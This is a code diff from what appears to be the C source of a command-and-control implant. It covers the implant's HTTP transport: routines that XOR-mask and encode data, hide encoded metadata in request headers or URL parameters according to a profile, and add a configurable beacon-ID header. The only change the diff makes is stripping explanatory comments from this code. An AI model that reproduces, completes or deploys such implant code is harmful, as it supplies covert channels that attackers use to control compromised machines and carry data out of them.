@@ -19,14 +19,12 @@ FUNC UINT32 NaxEncodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
     PBYTE mask_buf = work;
     PCHAR enc_buf  = (PCHAR)( work + mask_cap );
 
-    /* XOR mask */
     if ( cfg->Mask ) {
         input_len = NaxXorMask( Nax, input, input_len, mask_buf, mask_cap );
         if ( input_len == 0 ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, work ); return 0; }
         input = mask_buf;
     }
 
-    /* Encode */
     UINT32 enc_len = 0;
     switch ( cfg->Format ) {
     case NAX_FMT_BASE64:
@@ -47,7 +45,6 @@ FUNC UINT32 NaxEncodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
         break;
     }
 
-    /* Prepend + encoded + append */
     UINT32 total = cfg->PrependLen + enc_len + cfg->AppendLen;
     if ( total > dst_cap ) { Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, work ); return 0; }
     UINT32 off = 0;
@@ -63,7 +60,6 @@ FUNC UINT32 NaxDecodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
     PBYTE  data     = (PBYTE)src;
     UINT32 data_len = src_len;
 
-    /* Strip prepend/append */
     if ( data_len >= cfg->PrependLen + cfg->AppendLen ) {
         data     += cfg->PrependLen;
         data_len -= cfg->PrependLen + cfg->AppendLen;
@@ -73,7 +69,6 @@ FUNC UINT32 NaxDecodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
     PBYTE dec_buf = (PBYTE)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, buf_sz );
     if ( !dec_buf ) return 0;
 
-    /* Decode format */
     UINT32 dec_len = 0;
     switch ( cfg->Format ) {
     case NAX_FMT_BASE64:
@@ -90,7 +85,6 @@ FUNC UINT32 NaxDecodeData( PNAX_INSTANCE Nax, const NAX_OUTPUT_CFG* cfg, const P
         break;
     }
 
-    /* XOR unmask */
     if ( cfg->Mask && dec_len > 4 ) {
         UINT32 r = NaxXorUnmask( dec_buf, dec_len, dst, dst_cap );
         Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, dec_buf );
@@ -126,14 +120,12 @@ FUNC UINT32 NaxAppendCRLF( PWCHAR out, UINT32 wi, UINT32 cap ) {
 FUNC VOID NaxBuildRequestHeaders( PNAX_INSTANCE Nax, const PCHAR sid, const PCHAR hdr_base, UINT32 hdr_stride, BYTE hdr_count, const NAX_OUTPUT_CFG* meta_cfg, const PCHAR meta_encoded, UINT32 meta_encoded_len, BOOL is_post, PWCHAR out, UINT32 out_cap ) {
     UINT32 wi = 0;
 
-    /* Beacon ID header - name from profile (default: X-Beacon-Id) */
     wi = NaxAppendAsciiW( Nax->Config.BeaconIdHdr, out, wi, out_cap );
     if ( wi < out_cap - 1 ) out[ wi++ ] = L':';
     if ( wi < out_cap - 1 ) out[ wi++ ] = L' ';
     wi = NaxAppendAsciiW( sid, out, wi, out_cap );
     wi = NaxAppendCRLF( out, wi, out_cap );
 
-    /* Place metadata per OutputConfig placement */
     if ( meta_encoded && meta_encoded_len > 0 ) {
         switch ( meta_cfg->Placement ) {
         case NAX_PLACE_HEADER: {
@@ -168,7 +160,6 @@ FUNC VOID NaxBuildRequestHeaders( PNAX_INSTANCE Nax, const PCHAR sid, const PCHA
         wi = NaxAppendCRLF( out, wi, out_cap );
     }
 
-    /* Extra headers from profile */
     for ( BYTE h = 0; h < hdr_count; h++ ) {
         wi = NaxAppendAsciiW( hdr_base + h * hdr_stride, out, wi, out_cap );
         wi = NaxAppendCRLF( out, wi, out_cap );
@@ -232,16 +223,13 @@ FUNC BOOL NaxBuildUrl( PNAX_INSTANCE Nax, const PWCHAR url_w, PCHAR uri, PWCHAR 
 FUNC VOID NaxBuildPathWithParams( PWCHAR path_src, PWCHAR path_out, UINT32 path_cap, const NAX_OUTPUT_CFG* meta_cfg, const PCHAR meta_encoded, UINT32 meta_encoded_len, const PCHAR param_base, UINT32 param_stride, BYTE param_count ) {
     UINT32 wi = 0;
 
-    /* Copy base path */
     while ( path_src[ wi ] && wi < path_cap - 256 ) { path_out[ wi ] = path_src[ wi ]; wi++; }
 
     BOOL has_qmark = FALSE;
-    /* Check if path already contains '?' */
     for ( UINT32 c = 0; c < wi; c++ ) {
         if ( path_out[ c ] == L'?' ) { has_qmark = TRUE; break; }
     }
 
-    /* Append metadata as parameter if placement == PARAMETER */
     if ( meta_cfg && meta_encoded && meta_encoded_len > 0 && meta_cfg->Placement == NAX_PLACE_PARAMETER ) {
         if ( ! has_qmark ) { path_out[ wi++ ] = L'?'; has_qmark = TRUE; }
         else               { path_out[ wi++ ] = L'&'; }
@@ -250,7 +238,6 @@ FUNC VOID NaxBuildPathWithParams( PWCHAR path_src, PWCHAR path_out, UINT32 path_
         wi = NaxAppendAsciiW( meta_encoded, path_out, wi, path_cap );
     }
 
-    /* Append static parameters: each entry is "name=value" */
     for ( BYTE p = 0; p < param_count; p++ ) {
         if ( ! has_qmark ) { path_out[ wi++ ] = L'?'; has_qmark = TRUE; }
         else               { path_out[ wi++ ] = L'&'; }
